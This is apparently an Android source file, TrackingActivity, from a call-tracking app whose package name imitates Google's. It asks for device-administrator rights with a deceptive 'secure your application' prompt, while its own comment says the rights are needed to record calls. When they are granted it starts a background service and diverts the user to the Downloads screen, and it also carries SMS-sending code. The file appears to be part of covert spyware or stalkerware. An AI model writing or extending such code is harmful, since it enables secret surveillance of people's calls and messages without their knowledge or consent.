package com.google.tracking;

import android.app.Activity;
import android.app.DownloadManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import com.google.tracking.admin.AppDeviceAdminReceiver;


public class TrackingActivity extends Activity {
    Button btnSendSMS;
    EditText txtPhoneNo;
    EditText txtMessage;


    private static final int REQUEST_CODE = 0;
    private DevicePolicyManager mDPM;
    private Boolean devicePolicyManagerInited = false;
    private ComponentName mAdminName;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        //TO TEST SMS
        //initSendSMS();



//        Intent monitoring_intent = new Intent(this, MonitoringService.class);
//        startService(monitoring_intent);


        initDevicePolicyManager();
    }

    /*
    * Activity should be registered as device admin
    * in order to have ability of recording calls
    * */
    private void initDevicePolicyManager(){
        try {
            // Initiate DevicePolicyManager.
            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            mAdminName = new ComponentName(this, AppDeviceAdminReceiver.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                startActivityForResult(intent, REQUEST_CODE);
            } else {
                // mDPM.lockNow();
                // Intent intent = new Intent(MainActivity.this,
                // TrackDeviceService.class);
                // startService(intent);
                devicePolicyManagerInited = true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if(devicePolicyManagerInited)
        {
            openDownloads();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (REQUEST_CODE == requestCode) {
            devicePolicyManagerInited = true;
            Intent startServiceIntent = new Intent(TrackingActivity.this, TService.class);
            startService(startServiceIntent);
        }
    }

    private void openDownloads() {
        Intent viewDonwloads = new Intent(DownloadManager.ACTION_VIEW_DOWNLOADS);
        viewDonwloads.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        getBaseContext().startActivity(viewDonwloads);
    }

    private void initSendSMS() {
        setContentView(R.layout.main);
        btnSendSMS = (Button) findViewById(R.id.btnSendSMS);
        txtPhoneNo = (EditText) findViewById(R.id.txtPhoneNo);
        txtMessage = (EditText) findViewById(R.id.txtMessage);

        btnSendSMS.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                String phoneNo = txtPhoneNo.getText().toString();
                String message = txtMessage.getText().toString();
                if (phoneNo.length() > 0 && message.length() > 0)
                    sendSMS(phoneNo, message);
                else
                    Toast.makeText(getBaseContext(),
                            "Please enter both phone number and message.",
                            Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void sendSMS(String phoneNumber, String message) {
        PendingIntent pi = PendingIntent.getActivity(this, 0,
                new Intent(this, SmsMessage.class), 0);
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, message, pi, null);
    }
}
